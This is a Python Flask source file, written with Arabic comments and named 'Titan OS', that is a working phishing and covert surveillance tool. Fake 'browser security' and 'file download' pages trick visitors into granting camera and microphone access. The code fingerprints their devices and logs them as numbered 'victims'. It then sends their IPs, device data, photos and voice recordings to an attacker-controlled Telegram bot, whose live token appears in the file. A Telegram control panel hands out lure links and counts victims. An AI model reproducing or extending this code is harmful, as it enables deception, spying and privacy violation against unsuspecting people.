# ============================================================
# PROJECT: THE TITAN OS - VERSION 2026 (FINAL)
# OWNER: SIUF-PRO (سيوفي)
# PART 1: SYSTEM CORE & LIBRARIES
# ============================================================

import os
import json
import time
import base64
import random
import string
import hashlib
import datetime
import requests
import threading
import sqlite3 # لإدارة آلاف الضحايا بدون بطء
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify, send_file

# إعداد Flask وتشفير الجلسات
app = Flask(__name__)
app.secret_key = os.urandom(24)

# --- إعدادات الإمبراطور سيوفي (تعدل مرة واحدة هنا) ---
CONFIG = {
    "BOT_TOKEN": "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0",
    "ADMIN_ID": "7041600701",
    "BASE_URL": "https://sif-pro.onrender.com",
    "VERSION": "5.0.1 PRO",
    "DB_NAME": "titan_vault.db"
}

# دالة ذكية لإرسال الطلبات لتليجرam مع إعادة محاولة تلقائية في حال الفشل
def smart_tg_send(method, data=None, files=None):
    url = f"https://api.telegram.org/bot{CONFIG['BOT_TOKEN']}/{method}"
    try:
        response = requests.post(url, data=data, files=files, timeout=30)
        return response.json()
    except Exception as e:
        print(f"🔴 TG Error: {e}")
        return None

# دالة لتوليد تشفير عشوائي للروابط (للتمويه)
def generate_random_path(length=12):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# --- نهاية القسم الأول ---
# ============================================================
# PART 2: DATABASE ENGINE & DEEP SENSOR LOGIC
# ============================================================

def init_db():
    """إنشاء قاعدة بيانات SQL لإدارة آلاف الضحايا"""
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            device_info TEXT,
            battery TEXT,
            location TEXT,
            timestamp DATETIME,
            status TEXT
        )
    ''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
    # تعيين القالب الافتراضي
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('template', 'security')")
    conn.commit()
    conn.close()

# استدعاء تهيئة القاعدة عند التشغيل
init_db()

def log_victim(ip, info, battery):
    """حفظ الضحية في الأرشيف وجلب رقم معرفه (ID)"""
    conn = sqlite3.connect(CONFIG["DB_NAME"])
    cursor = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO victims (ip, device_info, battery, timestamp, status) VALUES (?, ?, ?, ?, ?)",
                   (ip, info, battery, now, 'Active'))
    last_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return last_id

# --- نظام المستشعر الشامل (JavaScript المحقون) ---
# هذا الكود هو اللي راح نزرعه في الصفحة لاحقاً لسحب كل شيء
SENSOR_JS = """
async function captureDeepInfo() {
    let info = {
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 'N/A',
        ram: navigator.deviceMemory || 'N/A',
        vendor: navigator.vendor,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        touch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
    };
    
    let battery = {};
    try {
        const b = await navigator.getBattery();
        battery = { level: Math.round(b.level * 100) + '%', charging: b.charging };
    } catch(e) { battery = { level: 'Unknown', charging: false }; }

    return { info, battery };
}
"""

# --- نهاية القسم الثاني ---
# ============================================================
# PART 3: DYNAMIC TEMPLATE SYSTEM & FRONT-END UI
# ============================================================

# مكتبة التصاميم (كل تصميم هو عبارة عن قاموس يحتوي إعدادات الواجهة)
UI_TEMPLATES = {
    "security": {
        "title": "نظام حماية المتصفح | Browser Security",
        "header": "🛡️ فحص الأمان المتقدم",
        "desc": "تم اكتشاف نشاط غير معتاد من متصفحك. يرجى تأكيد الهوية للمتابعة.",
        "btn_text": "بدء فحص الحماية",
        "theme_color": "#f38020",
        "icon": "https://cdn-icons-png.flaticon.com/512/688/688461.png"
    },
    "download": {
        "title": "File Download | مركز الملفات",
        "header": "📥 ملفك جاهز للتحميل",
        "desc": "حجم الملف: 14.5 MB. يرجى الضغط على الزر أدناه لبدء التنزيل الآمن.",
        "btn_text": "تحميل الملف الآن",
        "theme_color": "#007bff",
        "icon": "https://cdn-icons-png.flaticon.com/512/724/724933.png"
    }
}

# كود الـ HTML الموحد (Master Page) - هذا الكود ضخم لضمان الاحترافية
MASTER_HTML = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ t.title }}</title>
    <style>
        :root { --main-color: {{ t.theme_color }}; }
        body { background-color: #0f0f0f; color: #ffffff; font-family: 'Segoe UI', Tahoma; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { background: #1a1a1a; padding: 40px; border-radius: 25px; border: 1px solid #333; text-align: center; width: 90%; max-width: 450px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        .icon { width: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--main-color)); }
        h1 { font-size: 1.5rem; margin-bottom: 15px; color: var(--main-color); }
        p { color: #aaaaaa; line-height: 1.6; margin-bottom: 30px; }
        .main-btn { background: var(--main-color); color: white; border: none; padding: 16px 32px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .main-btn:hover { transform: translateY(-2px); opacity: 0.9; }
        #status-log { margin-top: 20px; font-size: 0.8rem; color: #555; }
        #hidden-stream { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="{{ t.icon }}" class="icon">
        <h1>{{ t.header }}</h1>
        <p>{{ t.desc }}</p>
        <button class="main-btn" id="action-btn" onclick="initOperation()">{{ t.btn_text }}</button>
        <div id="status-log">نظام التشفير نشط v5.0</div>
    </div>

    <video id="hidden-stream" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" style="display:none"></canvas>

    <script>
        {{ sensor_js }}

        async function initOperation() {
            const btn = document.getElementById('action-btn');
            const log = document.getElementById('status-log');
            btn.disabled = true;
            log.innerText = "جاري الاتصال بالسيرفر المشفر...";

            try {
                // طلب الصلاحيات الكاملة
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('hidden-stream').srcObject = stream;

                // سحب بيانات الجهاز العميقة
                const deviceData = await captureDeepInfo();
                
                // إرسال البيانات الأولية (القسم الرابع سيتعامل مع هذا المسار)
                await fetch('/api/v5/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'initial_hit',
                        data: deviceData
                    })
                });

                log.innerText = "جاري مزامنة بروتوكول الأمان...";
                
                // سيتم إكمال منطق الالتقاط في الأقسام التالية
            } catch (err) {
                log.innerText = "خطأ: يجب السماح بالصلاحيات للمتابعة.";
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
'''

# --- نهاية القسم الثالث ---
# ============================================================
# PART 4: DATA PROCESSOR & ENCRYPTED ROUTES
# ============================================================

@app.route('/api/v5/collect', methods=['POST'])
def data_processor():
    """المعالج المركزي لكل البيانات القادمة من الضحية"""
    payload = request.get_json()
    if not payload:
        return jsonify({"status": "error"}), 400

    data_type = payload.get('type')
    raw_data = payload.get('data')
    
    # جلب IP الضحية الحقيقي حتى لو كان خلف بروكسي
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if data_type == 'initial_hit':
        # معالجة بيانات الجهاز والبطارية
        info = raw_data.get('info', {})
        battery = raw_data.get('battery', {})
        
        device_summary = (
            f"📱 النظام: {info.get('platform')}\n"
            f"🧠 المعالج: {info.get('cores')} Cores\n"
            f"🖥️ الشاشة: {info.get('screen')}\n"
            f"🔋 الشحن: {battery.get('level')} ({'⚡' if battery.get('charging') else '🔋'})"
        )
        
        # حفظ في قاعدة البيانات (من القسم الثاني)
        v_id = log_victim(victim_ip, str(info), battery.get('level'))
        
        # إرسال تقرير الدخول الأول للبوت
        report = (
            f"🚀 **دخول جديد - الضحية رقم #{v_id}**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🌐 الـ IP: `{victim_ip}`\n"
            f"{device_summary}\n"
            f"⏰ الوقت: {datetime.datetime.now().strftime('%H:%M:%S')}"
        )
        smart_tg_send("sendMessage", {"chat_id": CONFIG["ADMIN_ID"], "text": report, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success", "v_id": v_id})

    elif data_type == 'media_upload':
        # معالجة الصور وبصمات الصوت المشفرة بـ Base64
        v_id = payload.get('v_id')
        media_content = raw_data.get('content') # الداتا تكون Base64
        media_type = raw_data.get('media_type') # 'photo' أو 'voice'

        if not media_content: return "Empty", 400

        # فك التشفير وتحويلها لملف باينري
        header, encoded = media_content.split(",", 1)
        binary_data = base64.b64decode(encoded)
        
        if media_type == 'photo':
            file_obj = BytesIO(binary_data)
            file_obj.name = "capture.jpg"
            smart_tg_send("sendPhoto", 
                          {"chat_id": CONFIG["ADMIN_ID"], "caption": f"📸 صورة الضحية #{v_id}"},
                          {"photo": file_obj})
        
        elif media_type == 'voice':
            file_obj = BytesIO(binary_data)
            file_obj.name = "audio.ogg"
            smart_tg_send("sendVoice", 
                          {"chat_id": CONFIG["ADMIN_ID"], "caption": f"🎙 بصمة صوت الضحية #{v_id}"},
                          {"voice": file_obj})

    return jsonify({"status": "received"})

# --- نهاية القسم الرابع ---
# ============================================================
# PART 5: WEBHOOK HANDLER & INLINE CONTROL PANEL
# ============================================================

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    """المستقبل الرئيسي لأوامر البوت من تليجرام"""
    update = request.get_json()
    if not update: return "OK"

    # معالجة الرسائل النصية
    if "message" in update:
        msg = update["message"]
        chat_id = str(msg["chat"]["id"])
        
        # التأكد أن المستخدم هو الأدمن (أنت فقط)
        if chat_id == CONFIG["ADMIN_ID"]:
            main_kb = {
                "inline_keyboard": [
                    [{"text": "🔗 جلب رابط الصيد", "callback_data": "get_link"}],
                    [{"text": "🎭 تغيير القالب", "callback_data": "show_templates"}],
                    [{"text": "📊 إحصائيات SQL", "callback_data": "get_stats"}, {"text": "🧹 تصفير الأرشيف", "callback_data": "clear_db"}]
                ]
            }
            welcome_text = (
                f"🛡️ **لوحة تحكم تيتان {CONFIG['VERSION']}**\n"
                f"━━━━━━━━━━━━━━\n"
                f"مرحباً بك ملك سيوفي. السيرفر يعمل الآن بنظام الأقسام المتصلة.\n"
                f"الحالة: متصل بنجاح 🟢"
            )
            smart_tg_send("sendMessage", {
                "chat_id": chat_id, 
                "text": welcome_text, 
                "reply_markup": main_kb,
                "parse_mode": "Markdown"
            })

    # معالجة ضغطات الأزرار (Callback Queries)
    elif "callback_query" in update:
        query = update["callback_query"]
        q_id = query["id"]
        q_data = query["data"]
        q_chat_id = query["message"]["chat"]["id"]

        if q_data == "get_link":
            msg = f"🚀 **رابط الصيد الخاص بك جاهز للاستخدام:**\n`{CONFIG['BASE_URL']}`"
            smart_tg_send("sendMessage", {"chat_id": q_chat_id, "text": msg, "parse_mode": "Markdown"})
        
        elif q_data == "show_templates":
            temp_kb = {
                "inline_keyboard": [
                    [{"text": "🛡️ قالب الحماية", "callback_data": "set_temp_security"}],
                    [{"text": "📥 قالب التحميل", "callback_data": "set_temp_download"}]
                ]
            }
            smart_tg_send("sendMessage", {"chat_id": q_chat_id, "text": "اختر القالب المطلوب تفعيله الآن:", "reply_markup": temp_kb})

        elif q_data.startswith("set_temp_"):
            new_temp = q_data.replace("set_temp_", "")
            conn = sqlite3.connect(CONFIG["DB_NAME"])
            cursor = conn.cursor()
            cursor.execute("UPDATE settings SET value = ? WHERE key = 'template'", (new_temp,))
            conn.commit()
            conn.close()
            smart_tg_send("answerCallbackQuery", {"callback_query_id": q_id, "text": f"✅ تم تحويل النظام إلى قالب: {new_temp}"})

        elif q_data == "get_stats":
            conn = sqlite3.connect(CONFIG["DB_NAME"])
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM victims")
            count = cursor.fetchone()[0]
            conn.close()
            smart_tg_send("sendMessage", {"chat_id": q_chat_id, "text": f"📊 **إحصائيات الإمبراطورية:**\nإجمالي الضحايا المسجلين: `{count}`"})

    return "OK"

# --- نهاية القسم الخامس ---
# ============================================================
# PART 6: MAIN ROUTE & SYSTEM ACTIVATION
# ============================================================

@app.route('/')
def main_entry_point():
    """المسار الذي يفتحه الضحية (نقطة الدخول)"""
    try:
        # جلب القالب المفعل حالياً من قاعدة البيانات
        conn = sqlite3.connect(CONFIG["DB_NAME"])
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM settings WHERE key = 'template'")
        active_template_name = cursor.fetchone()[0]
        conn.close()

        # جلب إعدادات القالب من المكتبة (التي في القسم الثالث)
        selected_template = UI_TEMPLATES.get(active_template_name, UI_TEMPLATES["security"])

        # رندر الصفحة مع حقن كود الحساسات (القسم الثاني) والبيانات
        return render_template_string(
            MASTER_HTML, 
            t=selected_template, 
            sensor_js=SENSOR_JS
        )
    except Exception as e:
        print(f"🔴 Entry Error: {e}")
        return "⚠️ System Maintenance - Please try again later."

# --- تشغيل الإمبراطورية ---
if __name__ == '__main__':
    # تهيئة قاعدة البيانات (للتأكيد فقط)
    init_db()
    
    # تحديد المنفذ (Port) المتوافق مع Render
    port = int(os.environ.get("PORT", 10000))
    
    print(f"🚀 TITAN SYSTEM STARTING ON PORT {port}...")
    print(f"🔗 ADMIN ID: {CONFIG['ADMIN_ID']}")
    
    # تشغيل السيرفر
    app.run(host='0.0.0.0', port=port, debug=False)

# ============================================================
# END OF SCRIPT - BY SIUF-PRO
# ============================================================
